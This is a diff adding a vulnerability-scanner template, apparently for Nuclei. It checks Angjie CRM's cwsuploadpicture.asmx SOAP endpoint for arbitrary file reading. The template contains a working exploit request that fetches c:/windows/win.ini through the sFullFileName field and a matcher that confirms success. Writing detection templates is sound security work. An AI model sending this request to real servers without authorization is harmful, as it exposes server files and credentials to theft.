@@ -1,0 +1,36 @@
+id: angjieCRM-cwsuploadpicture_asmx-File-reading
+
+info:
+  name: 昂捷CRM cwsuploadpicture.asmx 任意文件读取
+  author: HuanXiong
+  severity: high
+
+  tags: File Reading
+
+http:
+  - raw:
+      - |
+        POST /enjoyRMIS_WS/WS/Common/cwsuploadpicture.asmx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/GetPicture"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetPicture xmlns="http://tempuri.org/">
+              <sFullFileName>c:/windows/win.ini</sFullFileName>
+            </GetPicture>
+          </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'OyBmb3IgMTYtYml0IGFwcCBzdXBwb3J0'
+      - type: status
+        status: 
+          - 200
